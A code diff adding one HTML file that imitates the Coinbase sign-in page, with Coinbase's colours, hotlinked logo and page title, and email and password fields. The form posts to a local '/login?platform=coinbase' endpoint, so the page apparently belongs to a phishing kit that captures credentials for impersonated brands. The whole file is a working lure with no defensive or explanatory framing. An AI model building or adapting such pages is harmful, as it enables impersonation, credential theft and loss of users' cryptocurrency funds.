@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to Coinbase</title>
+    <style>
+        :root {
+            --coinbase-blue: #0052FF;
+            --coinbase-hover: #0040CC;
+            --background-color: #FFFFFF;
+            --text-color: #0A0B0D;
+            --secondary-text: #5B616E;
+            --border-color: #DCDCDC;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: "CoinbaseText", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
+            background: var(--background-color);
+            color: var(--text-color);
+            line-height: 1.5;
+        }
+
+        .container {
+            max-width: 440px;
+            margin: 0 auto;
+            padding: 24px 16px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .coinbase-logo {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .coinbase-logo img {
+            width: 120px;
+            height: auto;
+        }
+
+        .login-box {
+            background: white;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 32px 24px;
+            box-shadow: 0px 1px 3px rgba(0, 0, 0, 0.1);
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: var(--text-color);
+        }
+
+        p {
+            color: var(--secondary-text);
+            margin-bottom: 24px;
+            font-size: 14px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            color: var(--text-color);
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            font-size: 16px;
+            transition: all 0.2s;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: var(--coinbase-blue);
+            box-shadow: 0 0 0 2px rgba(0, 82, 255, 0.2);
+        }
+
+        button {
+            background: var(--coinbase-blue);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 12px 24px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            margin-bottom: 16px;
+            transition: background-color 0.2s;
+        }
+
+        button:hover {
+            background: var(--coinbase-hover);
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin-bottom: 16px;
+        }
+
+        .forgot-password a {
+            color: var(--coinbase-blue);
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        .signup-link {
+            text-align: center;
+            margin-top: 24px;
+            font-size: 14px;
+            color: var(--secondary-text);
+        }
+
+        .signup-link a {
+            color: var(--coinbase-blue);
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .signup-link a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="coinbase-logo">
+            <img src="https://images.ctfassets.net/q5ulk4bp65r7/3TBS4oVkD1ghowTqVQJlqj/2dfd4ea3b623a7c0d8deb2ff445dee9e/Consumer_Wordmark.svg" alt="Coinbase">
+        </div>
+        <div class="login-box">
+            <h1>Sign in to Coinbase</h1>
+            <p>Not your device? Use a private or incognito window to sign in.</p>
+            
+            <form action="/login?platform=coinbase" method="POST">
+                <div class="form-group">
+                    <label for="email">Email</label>
+                    <input type="email" id="email" name="email" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" required>
+                </div>
+
+                <div class="forgot-password">
+                    <a href="#">Forgot password?</a>
+                </div>
+
+                <button type="submit">Sign in</button>
+
+                <div class="signup-link">
+                    Don't have an account? <a href="#">Get started</a>
+                </div>
+            </form>
+        </div>
+    </div>
+</body>
+</html> 
